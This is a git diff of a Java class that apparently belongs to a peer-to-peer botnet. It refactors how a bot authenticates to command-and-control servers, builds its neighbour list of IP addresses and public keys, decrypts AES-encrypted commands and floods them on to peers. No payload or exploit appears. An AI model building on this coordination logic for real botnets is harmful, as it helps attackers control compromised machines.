@@ -7,7 +7,6 @@ import java.util.ArrayList;
 import java.util.Collections;
 import java.util.List;
 
-import org.apache.commons.codec.binary.Base64;
 import org.springframework.beans.factory.annotation.Autowired;
 import org.springframework.scheduling.annotation.Async;
 import org.springframework.stereotype.Service;
@@ -75,16 +74,12 @@ public class Behavior {
 	 * 
 	 */
 	public void initializeBot() {
-
 		// nServ.firstConnectToMockServerDns();
-
 		if (challengeToCommandConquer()) {
 			System.out.println("Bot is Ready");
 		} else
 			System.out.println("Bot not Ready, authentication failed");
-
 		String data = nServ.getIdHash();
-
 		List<Pairs<IP, PublicKey>> ips = nServ.getCommandConquerIps().getList();
 		List<Pairs<String, String>> response = null;
 		response = req.askNeighbours(ips.get(0).getValue1().toString(), nServ.getMyIp().toString(), data);
@@ -94,20 +89,15 @@ public class Behavior {
 			response.forEach(ob -> System.out.println("torno2 " + ob.getValue1().toString()));
 		} else
 			System.out.println("torno null");
-
-		for (Pairs<String, String> pairs : response) {
-			Pairs<IP, PublicKey> in = new Pairs<IP, PublicKey>();
-			in.setValue1(new IP(pairs.getValue1()));
-			in.setValue2(pki.rebuildPuK(pairs.getValue2()));
-			newNeighbours.add(in);
-		}
-
+		newNeighbours = nServ.tramsuteNeigha(response);
 		if (newNeighbours != null) {
 			newNeighbours.forEach(ob -> System.out.println("torno2 " + ob.getValue1().toString()));
 		} else
 			System.out.println("torno null");
-
 		nServ.getNeighbours().setAll(newNeighbours);
+		SyncIpList<IP, PublicKey> buf = nServ.getNeighbours();
+		buf.setAll(newNeighbours);
+		nServ.setNeighbours(buf);
 
 	}
 
@@ -174,9 +164,9 @@ public class Behavior {
 		// decritta il msg
 		System.out.println("rawdata: " + rawData);
 		msg = pki.getCrypto().decryptAES(rawData);
-		System.out.println("msg: " + msg.toString());
 		if (msg == null)
 			return;
+		System.out.println("msg: " + msg.toString());
 		// Per comodità
 		String[] msgs = msg.split("<HH>");
 
@@ -215,6 +205,8 @@ public class Behavior {
 		}
 
 	}
+	
+	
 
 	@Async
 	private void floodNeighoours(String msg, IP ip) {
